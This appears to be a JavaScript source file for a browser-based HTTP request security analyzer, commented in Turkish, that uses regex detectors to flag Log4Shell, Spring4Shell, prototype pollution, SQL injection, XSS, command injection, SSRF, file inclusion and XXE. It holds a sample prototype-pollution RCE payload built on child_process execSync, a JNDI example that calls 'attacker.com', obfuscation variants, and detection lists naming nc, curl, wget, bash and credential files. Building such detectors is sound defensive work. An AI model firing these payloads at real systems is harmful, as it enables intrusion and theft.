/**
 * Request Analyzer - Security Analysis Module
 * Security Toolkit
 * Tamamen client-side çalışan HTTP request güvenlik analiz aracı
 */

// Örnek zararlı request
const SAMPLE_REQUEST = `POST / HTTP/1.1
Host: example.com
User-Agent: Mozilla/5.0
Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryx8jO2oVc6SWP3Sad

------WebKitFormBoundaryx8jO2oVc6SWP3Sad
Content-Disposition: form-data; name="0"

{"then":"$1:__proto__:then","_response":{"_prefix":"var res=process.mainModule.require('child_process').execSync('echo 1337').toString();"}}
------WebKitFormBoundaryx8jO2oVc6SWP3Sad--`;

/**
 * HTTP Request'i analiz eder ve güvenlik tehditleri arar
 * @param {string} raw - Raw HTTP request metni
 * @returns {Object} Analiz sonucu
 */
function analyzeRequest(raw) {
    // Boş kontrol
    if (!raw || raw.trim().length === 0) {
        return {
            malicious: false,
            attackType: "none",
            verdict: "Temiz",
            shortLabel: "Boş İstek",
            explanation: "Lütfen analiz edilecek bir HTTP request girin.",
            signals: []
        };
    }

    // Request'i parse et
    const parsed = parseRequest(raw);
    
    // Saldırı tespit fonksiyonları (öncelik sırasına göre)
    // Log4j/JNDI ve Spring4Shell en üstte - kritik öncelik!
    const detectors = [
        detectLog4jJNDIInjection,
        detectSpring4Shell,
        detectPrototypePollution,
        detectSQLInjection,
        detectXSS,
        detectCommandInjection,
        detectSSRF,
        detectDirectoryTraversal,
        detectLFI_RFI,
        detectAuthBypass,
        detectXMLInjection,
        detectLDAP_Injection,
        detectXXE
    ];

    // Her tespit fonksiyonunu çalıştır
    for (const detector of detectors) {
        const result = detector(raw, parsed);
        if (result.malicious) {
            return result;
        }
    }

    // Hiçbir tehdit bulunamadı
    return {
        malicious: false,
        attackType: "none",
        verdict: "Temiz",
        shortLabel: "Temiz İstek",
        explanation: "Bu istek içinde bilinen bir saldırı izi tespit edilmedi. Ancak bu, isteğin kesinlikle güvenli olduğu anlamına gelmez. Daima ek güvenlik kontrolleri uygulayın.",
        signals: ["Bilinen saldırı pattern'i tespit edilmedi"]
    };
}

/**
 * Raw HTTP request'i parse eder
 * @param {string} raw - Raw HTTP request
 * @returns {Object} Parse edilmiş request
 */
function parseRequest(raw) {
    const lines = raw.split('\n');
    const parsed = {
        method: '',
        path: '',
        version: '',
        headers: {},
        body: '',
        raw: raw
    };

    // İlk satır: METHOD PATH VERSION
    const firstLine = lines[0];
    if (firstLine) {
        const parts = firstLine.trim().split(' ');
        parsed.method = parts[0] || '';
        parsed.path = parts[1] || '';
        parsed.version = parts[2] || '';
    }

    // Header ve body ayırma
    let bodyStartIndex = -1;
    for (let i = 1; i < lines.length; i++) {
        if (lines[i].trim() === '') {
            bodyStartIndex = i + 1;
            break;
        }
        
        // Header parse et
        const colonIndex = lines[i].indexOf(':');
        if (colonIndex > 0) {
            const key = lines[i].substring(0, colonIndex).trim();
            const value = lines[i].substring(colonIndex + 1).trim();
            parsed.headers[key.toLowerCase()] = value;
        }
    }

    // Body'yi al
    if (bodyStartIndex > 0 && bodyStartIndex < lines.length) {
        parsed.body = lines.slice(bodyStartIndex).join('\n');
    }

    return parsed;
}

/**
 * Log4j / JNDI Injection (Log4Shell) saldırısı tespiti
 * CVE-2021-44228 ve benzeri Log4j zafiyetlerini tespit eder
 */
function detectLog4jJNDIInjection(raw, parsed) {
    const signals = [];
    let detected = false;

    // 1. Basit JNDI Injection pattern'leri
    // Örnek: ${jndi:ldap://attacker.com/a}
    const basicJNDIPattern = /\$\{jndi:(ldap|rmi|dns|iiop|corba|nds|ldaps|rmiregistry):\/\/[^}]+\}/i;
    
    if (basicJNDIPattern.test(raw)) {
        detected = true;
        const match = raw.match(basicJNDIPattern);
        const protocol = match[1].toLowerCase();
        signals.push(`JNDI ${protocol.toUpperCase()} çağrısı tespit edildi: "${match[0].substring(0, 60)}..."`);
    }

    // 2. Obfuscated JNDI pattern'leri
    // Örnek: ${${::-j}${::-n}${::-d}${::-i}:ldap://...}
    // Bu pattern'de string'ler parçalanarak obfuscation yapılır
    const obfuscatedPatterns = [
        /\$\{\$\{::-j\}/i,  // ${${::-j} - "j" harfi
        /\$\{::-j\}/i,       // ${::-j}
        /\$\{::-n\}/i,       // ${::-n}
        /\$\{::-d\}/i,       // ${::-d}
        /\$\{::-i\}/i,       // ${::-i}
        /\$\{[^}]*::-[jndi]\}/i  // Genel obfuscation pattern
    ];

    let obfuscationDetected = false;
    for (const pattern of obfuscatedPatterns) {
        if (pattern.test(raw)) {
            obfuscationDetected = true;
            break;
        }
    }

    // Eğer obfuscation tespit edildiyse ve LDAP/RMI/DNS pattern'i varsa
    if (obfuscationDetected) {
        const protocolPattern = /:(ldap|rmi|dns|iiop):\/\//i;
        if (protocolPattern.test(raw)) {
            detected = true;
            signals.push('Obfuscation ile gizlenmiş JNDI injection pattern\'i tespit edildi');
            signals.push('String parçalama tekniği (${::-x}) kullanılmış');
        }
    }

    // 3. Log4j Expression Language (EL) pattern'leri
    const log4jELPatterns = [
        /\$\{env:[^}]+\}/i,           // ${env:...}
        /\$\{sys:[^}]+\}/i,           // ${sys:...}
        /\$\{java:[^}]+\}/i,          // ${java:...}
        /\$\{lower:[^}]+\}/i,         // ${lower:...}
        /\$\{upper:[^}]+\}/i,         // ${upper:...}
        /\$\{\$\{[^}]+\}\}/i          // İç içe ${${...}}
    ];

    // EL pattern'leri varsa ve JNDI ile kombinasyonsa
    let elDetected = false;
    for (const pattern of log4jELPatterns) {
        if (pattern.test(raw)) {
            elDetected = true;
            break;
        }
    }

    if (elDetected && /jndi:/i.test(raw)) {
        detected = true;
        signals.push('Log4j Expression Language (EL) ile JNDI kombinasyonu tespit edildi');
    }

    // 4. Bypass teknikleri
    const bypassPatterns = [
        /\$\{jndi:\$\{lower:/i,        // ${jndi:${lower:l}dap://...}
        /\$\{jndi:\$\{upper:/i,        // ${jndi:${upper:l}dap://...}
        /\$\{\$\{env:/i,               // ${${env:ENV_NAME}:...}
        /\$\{base64:/i                 // ${base64:...}
    ];

    for (const pattern of bypassPatterns) {
        if (pattern.test(raw)) {
            detected = true;
            signals.push('WAF bypass tekniği ile JNDI injection denemesi tespit edildi');
            break;
        }
    }

    // 5. URL encoding veya Unicode bypass kontrolleri
    const encodedPatterns = [
        /%24%7Bjndi:/i,                // URL encoded ${jndi:
        /\\u0024\\u007B/i,             // Unicode escape
        /%2524%257B/i                  // Double URL encoding
    ];

    for (const pattern of encodedPatterns) {
        if (pattern.test(raw)) {
            detected = true;
            signals.push('Encoding ile gizlenmiş JNDI payload tespit edildi');
            break;
        }
    }

    // Sonuç döndür
    if (detected) {
        return {
            malicious: true,
            attackType: "log4j_jndi_injection",
            verdict: "Zararlı",
            shortLabel: "Log4j / JNDI Injection (Log4Shell)",
            explanation: "Bu istek, Log4j kütüphanesini hedef alan kritik bir JNDI tabanlı uzaktan kod çalıştırma (RCE) girişimi içeriyor. Saldırgan, Log4Shell (CVE-2021-44228) zafiyetini kullanarak uygulamanın loglama sırasında uzak bir sunucuya bağlanmasını ve zararlı kod çalıştırmasını sağlamaya çalışıyor. Bu saldırı başarılı olursa tam sistem kontrolü ele geçirilebilir.",
            signals: signals
        };
    }

    return { malicious: false };
}

/**
 * Spring4Shell (CVE-2022-22965) saldırısı tespiti
 * Spring Framework bean property injection üzerinden RCE saldırısı
 */
function detectSpring4Shell(raw, parsed) {
    const signals = [];
    let detected = false;

    // Query string'i çıkar (ilk satırdan)
    let queryString = '';
    const firstLine = raw.split('\n')[0];
    const questionMarkIndex = firstLine.indexOf('?');
    if (questionMarkIndex > -1) {
        const spaceAfterQuery = firstLine.indexOf(' ', questionMarkIndex);
        if (spaceAfterQuery > -1) {
            queryString = firstLine.substring(questionMarkIndex + 1, spaceAfterQuery);
        } else {
            queryString = firstLine.substring(questionMarkIndex + 1);
        }
    }

    // 1. Spring4Shell için kritik pattern'ler - pipeline manipulation
    const spring4ShellPatterns = [
        /class\.module\.classLoader\.resources\.context\.parent\.pipeline\.first\.pattern/i,
        /class\.module\.classLoader\.resources\.context\.parent\.pipeline\.first\.suffix/i,
        /class\.module\.classLoader\.resources\.context\.parent\.pipeline\.first\.directory/i,
        /class\.module\.classLoader\.resources\.context\.parent\.pipeline\.first\.prefix/i,
        /class\.module\.classLoader\.resources\.context\.parent\.pipeline\.first\.fileDateFormat/i
    ];

    let pipelinePatternCount = 0;
    for (const pattern of spring4ShellPatterns) {
        if (pattern.test(queryString) || pattern.test(raw)) {
            pipelinePatternCount++;
        }
    }

    // En az 2 pipeline pattern'i varsa şüpheli
    if (pipelinePatternCount >= 2) {
        detected = true;
        signals.push('Query parametrelerinde "class.module.classLoader.resources.context.parent.pipeline" alanları tespit edildi');
    }

    // 2. Spring4Shell için spesifik hedefler
    // JSP suffix (.jsp uzantısı)
    if (/\.suffix=\.jsp/i.test(queryString) || /\.suffix=%2Ejsp/i.test(queryString)) {
        detected = true;
        signals.push('JSP suffix (.jsp) hedefleniyor - webshell yazma denemesi');
    }

    // webapps/ROOT dizini (Tomcat default web dizini)
    if (/\.directory=webapps[\/\\%2F]ROOT/i.test(queryString) || /\.directory=webapps[\/\\%2F]ROOT/i.test(raw)) {
        detected = true;
        signals.push('Tomcat webapps/ROOT dizini hedefleniyor - JSP dosyası yazma denemesi');
    }

    // 3. Body içinde JSP kodu kontrolü
    const jspPatterns = [
        /<%[\s\S]*?%>/,           // JSP scriptlet
        /<jsp:/i,                  // JSP directive
        /<%@/,                     // JSP page directive
        /<%=/                      // JSP expression
    ];

    for (const pattern of jspPatterns) {
        if (pattern.test(parsed.body)) {
            detected = true;
            signals.push('Body içinde JSP kodu (<% ... %>) tespit edildi - webshell payload');
            break;
        }
    }

    // 4. Runtime.getRuntime().exec() - Java RCE payload
    if (/Runtime\.getRuntime\(\)\.exec\(/i.test(raw)) {
        detected = true;
        signals.push('Runtime.getRuntime().exec() çağrısı tespit edildi - doğrudan komut çalıştırma');
    }

    // 5. Diğer Spring4Shell göstergeleri
    const additionalIndicators = [
        /class\.module\.classLoader/i,
        /\.first\.pattern=/i,
        /\.first\.fileDateFormat=/i
    ];

    let additionalCount = 0;
    for (const pattern of additionalIndicators) {
        if (pattern.test(raw)) {
            additionalCount++;
        }
    }

    // Ek göstergeler varsa ve pipeline pattern tespit edildiyse
    if (additionalCount >= 2 && pipelinePatternCount >= 1) {
        detected = true;
        if (signals.length === 0) {
            signals.push('Spring Framework bean property manipulation pattern\'leri tespit edildi');
        }
    }

    // 6. URL encoding ile gizlenmiş pattern'ler
    if (/classLoader%2E/i.test(raw) || /%2Emodule%2E/i.test(raw) || /%2Epipeline%2E/i.test(raw)) {
        if (pipelinePatternCount >= 1 || /webapps/i.test(raw)) {
            detected = true;
            signals.push('URL-encoded Spring bean property manipulation tespit edildi');
        }
    }

    // Sonuç döndür
    if (detected) {
        return {
            malicious: true,
            attackType: 'spring4shell',
            verdict: 'Zararlı',
            shortLabel: 'Spring4Shell (CVE-2022-22965)',
            explanation: 'Bu istek, Spring Framework üzerinde bean property injection kullanarak Tomcat web dizinine JSP dosyası yazdırmayı hedefleyen Spring4Shell (CVE-2022-22965) tabanlı bir uzaktan kod çalıştırma (RCE) saldırısıdır. Saldırgan, Spring\'in data binding mekanizmasını manipüle ederek Tomcat pipeline\'ına erişip zararlı JSP webshell yerleştirmeye çalışıyor.',
            signals: signals
        };
    }

    return { malicious: false };
}

/**
 * Prototype Pollution saldırısı tespiti
 */
function detectPrototypePollution(raw, parsed) {
    const signals = [];
    let detected = false;

    // Tipik prototype pollution pattern'leri
    const patterns = [
        /__proto__/i,
        /constructor\s*\[\s*prototype\s*\]/i,
        /\.prototype\./i,
        /\[['"]?constructor['"]?\]/i,
        /\[['"]?__proto__['"]?\]/i
    ];

    // Body'de prototype pollution araması
    for (const pattern of patterns) {
        if (pattern.test(parsed.body)) {
            detected = true;
            signals.push(`Body içinde "${parsed.body.match(pattern)[0]}" pattern'i tespit edildi`);
        }
    }

    // RCE ile kombinasyon kontrolü
    const rcePatterns = [
        /child_process/i,
        /require\s*\(/i,
        /exec\s*\(/i,
        /eval\s*\(/i,
        /mainModule/i,
        /execSync/i
    ];

    for (const pattern of rcePatterns) {
        if (pattern.test(raw)) {
            detected = true;
            signals.push(`Uzaktan kod çalıştırma denemesi: "${raw.match(pattern)[0]}"`);
        }
    }

    if (detected) {
        return {
            malicious: true,
            attackType: "prototype_pollution_rce",
            verdict: "Zararlı",
            shortLabel: "Prototype Pollution + RCE",
            explanation: "Bu istek, JavaScript nesne prototiplerini manipüle ederek sunucu tarafında komut çalıştırmaya çalışan tehlikeli bir saldırı içeriyor. Saldırgan, Node.js çalışma zamanı üzerinde kontrol kazanmaya çalışıyor.",
            signals: signals
        };
    }

    return { malicious: false };
}

/**
 * SQL Injection saldırısı tespiti
 */
function detectSQLInjection(raw, parsed) {
    const signals = [];
    let detected = false;

    // SQL Injection pattern'leri
    const patterns = [
        /(\bunion\b.*\bselect\b)|(\bselect\b.*\bunion\b)/i,
        /'\s*(or|and)\s*'?\d*'?\s*=\s*'?\d*/i,
        /;\s*drop\s+(table|database)/i,
        /exec(\s|\+)+(s|x)p\w+/i,
        /'.*--/,
        /\/\*.*\*\//,
        /concat\s*\(/i,
        /char\s*\(\s*\d+/i,
        /0x[0-9a-f]+/i,
        /benchmark\s*\(/i,
        /sleep\s*\(/i,
        /waitfor\s+delay/i,
        /information_schema/i,
        /'\s*or\s*1\s*=\s*1/i,
        /admin'\s*--/i,
        /'\s*;\s*shutdown/i
    ];

    for (const pattern of patterns) {
        if (pattern.test(raw)) {
            detected = true;
            const match = raw.match(pattern);
            signals.push(`SQL injection pattern'i tespit edildi: "${match[0].substring(0, 50)}..."`);
        }
    }

    if (detected) {
        return {
            malicious: true,
            attackType: "sqli",
            verdict: "Zararlı",
            shortLabel: "SQL Injection",
            explanation: "Bu istek, SQL sorgularını manipüle ederek veri tabanında yetkisiz erişim, veri sızdırma veya veri tabanı yapısına zarar verme amacı taşıyor. Saldırgan, SQL komutlarını enjekte ederek güvenliği bypass etmeye çalışıyor.",
            signals: signals
        };
    }

    return { malicious: false };
}

/**
 * Cross-Site Scripting (XSS) saldırısı tespiti
 */
function detectXSS(raw, parsed) {
    const signals = [];
    let detected = false;

    // XSS pattern'leri
    const patterns = [
        /<script[^>]*>.*<\/script>/is,
        /<script[^>]*>/i,
        /javascript:/i,
        /on\w+\s*=\s*["'][^"']*["']/i,
        /<iframe[^>]*>/i,
        /<object[^>]*>/i,
        /<embed[^>]*>/i,
        /eval\s*\(/i,
        /alert\s*\(/i,
        /document\.cookie/i,
        /document\.write/i,
        /<img[^>]+onerror/i,
        /<svg[^>]*onload/i,
        /expression\s*\(/i
    ];

    for (const pattern of patterns) {
        if (pattern.test(raw)) {
            detected = true;
            const match = raw.match(pattern);
            signals.push(`XSS payload tespit edildi: "${match[0].substring(0, 50)}..."`);
        }
    }

    if (detected) {
        return {
            malicious: true,
            attackType: "xss",
            verdict: "Zararlı",
            shortLabel: "Cross-Site Scripting (XSS)",
            explanation: "Bu istek, tarayıcı üzerinde zararlı script çalıştırmaya yönelik bir XSS saldırısı içeriyor. Saldırgan, kullanıcı oturumlarını çalmak, sayfa içeriğini değiştirmek veya kullanıcıları zararlı sitelere yönlendirmek amacıyla hareket ediyor.",
            signals: signals
        };
    }

    return { malicious: false };
}

/**
 * Command Injection saldırısı tespiti
 */
function detectCommandInjection(raw, parsed) {
    const signals = [];
    let detected = false;

    // Command injection pattern'leri
    const patterns = [
        /;\s*(ls|cat|wget|curl|nc|netcat|bash|sh|cmd|powershell)/i,
        /\|\s*(ls|cat|wget|curl|nc|netcat|bash|sh|cmd|powershell)/i,
        /`.*`/,
        /\$\(.*\)/,
        /&&\s*(ls|cat|wget|curl|nc|netcat|bash|sh|cmd)/i,
        /\|\|\s*(ls|cat|wget|curl|nc|netcat|bash|sh|cmd)/i,
        />\s*\/dev\/null/i,
        /2>&1/,
        /\/bin\/(bash|sh|zsh|ksh)/i,
        /cmd\.exe/i,
        /powershell\.exe/i
    ];

    for (const pattern of patterns) {
        if (pattern.test(raw)) {
            detected = true;
            const match = raw.match(pattern);
            signals.push(`Komut enjeksiyonu pattern'i: "${match[0].substring(0, 50)}..."`);
        }
    }

    if (detected) {
        return {
            malicious: true,
            attackType: "command_injection",
            verdict: "Zararlı",
            shortLabel: "Command Injection",
            explanation: "Bu istek, sunucu üzerinde sistem komutları çalıştırmaya yönelik tehlikeli bir saldırı içeriyor. Saldırgan, işletim sistemi seviyesinde komut çalıştırarak tam kontrol elde etmeye, dosyaları okumaya veya ağ üzerinden veri sızdırmaya çalışıyor.",
            signals: signals
        };
    }

    return { malicious: false };
}

/**
 * Server-Side Request Forgery (SSRF) saldırısı tespiti
 */
function detectSSRF(raw, parsed) {
    const signals = [];
    let detected = false;

    // SSRF pattern'leri
    const patterns = [
        /url\s*=\s*["']?https?:\/\/(localhost|127\.0\.0\.1|0\.0\.0\.0)/i,
        /url\s*=\s*["']?file:\/\//i,
        /url\s*=\s*["']?gopher:\/\//i,
        /url\s*=\s*["']?dict:\/\//i,
        /169\.254\.169\.254/,  // AWS metadata
        /metadata\.google\.internal/i,
        /169\.254\.\d+\.\d+/,
        /10\.\d+\.\d+\.\d+/,
        /192\.168\.\d+\.\d+/,
        /172\.(1[6-9]|2[0-9]|3[0-1])\.\d+\.\d+/
    ];

    for (const pattern of patterns) {
        if (pattern.test(raw)) {
            detected = true;
            const match = raw.match(pattern);
            signals.push(`SSRF pattern'i tespit edildi: "${match[0]}"`);
        }
    }

    if (detected) {
        return {
            malicious: true,
            attackType: "ssrf",
            verdict: "Zararlı",
            shortLabel: "Server-Side Request Forgery (SSRF)",
            explanation: "Bu istek, sunucuyu yanıltarak internal servislere veya cloud metadata endpoint'lerine istek göndertmeye çalışan bir SSRF saldırısı içeriyor. Saldırgan, erişilmemesi gereken internal kaynaklara ulaşmayı veya hassas bilgileri çalmayı hedefliyor.",
            signals: signals
        };
    }

    return { malicious: false };
}

/**
 * Directory Traversal saldırısı tespiti
 */
function detectDirectoryTraversal(raw, parsed) {
    const signals = [];
    let detected = false;

    // Directory traversal pattern'leri
    const patterns = [
        /\.\.[\/\\]/,
        /\.\.[\/\\]\.\.[\/\\]/,
        /\.\.%2[fF]/,
        /%2[eE]%2[eE]%2[fF]/,
        /%2[eE]%2[eE][\/\\]/,
        /\.\.\\/,
        /\.\.;/,
        /\.\.%00/,
        /\.\.%0[aA]/
    ];

    for (const pattern of patterns) {
        if (pattern.test(raw)) {
            detected = true;
            const match = raw.match(pattern);
            signals.push(`Directory traversal pattern'i: "${match[0]}"`);
        }
    }

    if (detected) {
        return {
            malicious: true,
            attackType: "directory_traversal",
            verdict: "Zararlı",
            shortLabel: "Directory Traversal",
            explanation: "Bu istek, dizin geçişi (directory traversal) yoluyla yetkisiz dosyalara erişmeye çalışıyor. Saldırgan, '../' gibi path manipülasyonları kullanarak sistem dosyalarına, yapılandırma dosyalarına veya hassas bilgilere ulaşmayı hedefliyor.",
            signals: signals
        };
    }

    return { malicious: false };
}

/**
 * Local/Remote File Inclusion (LFI/RFI) saldırısı tespiti
 */
function detectLFI_RFI(raw, parsed) {
    const signals = [];
    let detected = false;

    // LFI/RFI pattern'leri
    const patterns = [
        /\/etc\/passwd/i,
        /\/etc\/shadow/i,
        /\/proc\/self\/environ/i,
        /\/var\/log/i,
        /c:\\windows\\system32/i,
        /c:\\boot\.ini/i,
        /\.\.\/\.\.\/\.\.\//,
        /php:\/\/filter/i,
        /php:\/\/input/i,
        /data:\/\//i,
        /expect:\/\//i,
        /zip:\/\//i,
        /file=http/i,
        /include.*http/i,
        /require.*http/i
    ];

    for (const pattern of patterns) {
        if (pattern.test(raw)) {
            detected = true;
            const match = raw.match(pattern);
            signals.push(`LFI/RFI pattern'i: "${match[0]}"`);
        }
    }

    if (detected) {
        return {
            malicious: true,
            attackType: "lfi_rfi",
            verdict: "Zararlı",
            shortLabel: "Local/Remote File Inclusion",
            explanation: "Bu istek, yerel veya uzak dosya dahil etme (LFI/RFI) zafiyeti üzerinden sistem dosyalarını okumaya veya zararlı kod çalıştırmaya çalışıyor. Saldırgan, hassas dosyalara erişim sağlamak veya uzaktan kod çalıştırmak amacıyla hareket ediyor.",
            signals: signals
        };
    }

    return { malicious: false };
}

/**
 * Authentication Bypass saldırısı tespiti
 */
function detectAuthBypass(raw, parsed) {
    const signals = [];
    let detected = false;

    // Auth bypass pattern'leri
    const patterns = [
        /'?\s*or\s*'?1'?\s*=\s*'?1/i,
        /admin'\s*--/i,
        /admin'\s*#/i,
        /'\s*or\s*'?a'?\s*=\s*'?a/i,
        /'\)\s*or\s*\('?1'?\s*=\s*'?1/i,
        /"?\s*or\s*"?1"?\s*=\s*"?1/i,
        /password.*=.*null/i,
        /username.*=.*admin/i,
        /NoAuth/i,
        /BypassAuth/i,
        /auth.*bypass/i
    ];

    for (const pattern of patterns) {
        if (pattern.test(raw)) {
            detected = true;
            const match = raw.match(pattern);
            signals.push(`Auth bypass pattern'i: "${match[0].substring(0, 50)}..."`);
        }
    }

    if (detected) {
        return {
            malicious: true,
            attackType: "auth_bypass",
            verdict: "Zararlı",
            shortLabel: "Authentication Bypass",
            explanation: "Bu istek, kimlik doğrulama mekanizmasını bypass etmeye yönelik bir saldırı içeriyor. Saldırgan, giriş kontrollerini atlatarak yetkisiz erişim elde etmeye, admin paneline girmeye veya başka kullanıcı hesaplarını ele geçirmeye çalışıyor.",
            signals: signals
        };
    }

    return { malicious: false };
}

/**
 * XML Injection saldırısı tespiti
 */
function detectXMLInjection(raw, parsed) {
    const signals = [];
    let detected = false;

    const patterns = [
        /<!DOCTYPE[^>]*\[.*<!ENTITY/is,
        /<!ENTITY[^>]*SYSTEM/i,
        /<!ENTITY[^>]*PUBLIC/i,
        /&xxe;/i,
        /&\w+;.*SYSTEM/i
    ];

    for (const pattern of patterns) {
        if (pattern.test(raw)) {
            detected = true;
            signals.push('XML injection/XXE pattern\'i tespit edildi');
        }
    }

    if (detected) {
        return {
            malicious: true,
            attackType: "xml_injection",
            verdict: "Zararlı",
            shortLabel: "XML Injection / XXE",
            explanation: "Bu istek, XML dış varlık (XXE) saldırısı içeriyor. Saldırgan, XML parser'ı manipüle ederek dosya okuma, SSRF veya DoS saldırısı gerçekleştirmeye çalışıyor.",
            signals: signals
        };
    }

    return { malicious: false };
}

/**
 * LDAP Injection saldırısı tespiti
 */
function detectLDAP_Injection(raw, parsed) {
    const signals = [];
    let detected = false;

    const patterns = [
        /\*\)\(\w+=\*/,
        /\|\(objectClass=\*/i,
        /\)\(\|/,
        /&\(objectClass=\*/i
    ];

    for (const pattern of patterns) {
        if (pattern.test(raw)) {
            detected = true;
            const match = raw.match(pattern);
            signals.push(`LDAP injection pattern'i: "${match[0]}"`);
        }
    }

    if (detected) {
        return {
            malicious: true,
            attackType: "ldap_injection",
            verdict: "Zararlı",
            shortLabel: "LDAP Injection",
            explanation: "Bu istek, LDAP sorgularını manipüle ederek kimlik doğrulama bypass veya bilgi sızdırma amacı taşıyor. Saldırgan, LDAP filtrelerini değiştirerek yetkisiz erişim kazanmaya çalışıyor.",
            signals: signals
        };
    }

    return { malicious: false };
}

/**
 * XXE (XML External Entity) saldırısı tespiti
 */
function detectXXE(raw, parsed) {
    const signals = [];
    let detected = false;

    // Content-Type kontrolü
    const contentType = parsed.headers['content-type'] || '';
    if (contentType.includes('xml') || raw.includes('<?xml')) {
        const xxePatterns = [
            /<!ENTITY/i,
            /SYSTEM\s+["']file:/i,
            /SYSTEM\s+["']http:/i,
            /<!DOCTYPE[^>]*\[/i
        ];

        for (const pattern of xxePatterns) {
            if (pattern.test(raw)) {
                detected = true;
                signals.push('XXE saldırı pattern\'i tespit edildi');
            }
        }
    }

    if (detected) {
        return {
            malicious: true,
            attackType: "xxe",
            verdict: "Zararlı",
            shortLabel: "XXE (XML External Entity)",
            explanation: "Bu istek, XML External Entity (XXE) saldırısı içeriyor. Saldırgan, XML parser'da dış varlıkları kullanarak sistem dosyalarını okumaya, SSRF saldırısı gerçekleştirmeye veya denial of service yapmaya çalışıyor.",
            signals: signals
        };
    }

    return { malicious: false };
}

/**
 * Analiz sonucunu UI'da gösterir
 * @param {Object} result - Analiz sonucu
 */
function displayResult(result) {
    const resultContainer = document.getElementById('result-container');
    const resultContent = document.getElementById('result-content');
    const statusBadge = document.getElementById('status-badge');
    const attackType = document.getElementById('attack-type');
    const explanation = document.getElementById('explanation');
    const signalsList = document.getElementById('signals-list');
    const signalsSection = document.getElementById('signals-section');

    // Empty state'i gizle, result content'i göster
    resultContainer.style.display = 'none';
    resultContent.style.display = 'block';

    // Status badge
    statusBadge.textContent = result.verdict;
    statusBadge.className = 'status-badge ' + (result.malicious ? 'malicious' : 'clean');

    // Saldırı türü
    attackType.textContent = result.shortLabel;

    // Açıklama
    explanation.textContent = result.explanation;

    // Teknik işaretler
    if (result.signals && result.signals.length > 0) {
        signalsSection.style.display = 'block';
        signalsList.innerHTML = '';
        result.signals.forEach(signal => {
            const li = document.createElement('li');
            li.textContent = signal;
            signalsList.appendChild(li);
        });
    } else {
        signalsSection.style.display = 'none';
    }
}

/**
 * Request Analyzer initialization
 */
function initRequestAnalyzer() {
    const requestInput = document.getElementById('request-input');
    const analyzeBtn = document.getElementById('analyze-btn');
    const sampleBtn = document.getElementById('sample-btn');

    // Analiz Et butonu
    analyzeBtn.addEventListener('click', () => {
        const raw = requestInput.value;
        const result = analyzeRequest(raw);
        displayResult(result);
    });

    // Örnek Request Yapıştır butonu
    sampleBtn.addEventListener('click', () => {
        requestInput.value = SAMPLE_REQUEST;
    });

    // Enter tuşu ile analiz (Ctrl+Enter veya Cmd+Enter)
    requestInput.addEventListener('keydown', (e) => {
        if ((e.ctrlKey || e.metaKey) && e.key === 'Enter') {
            analyzeBtn.click();
        }
    });
}

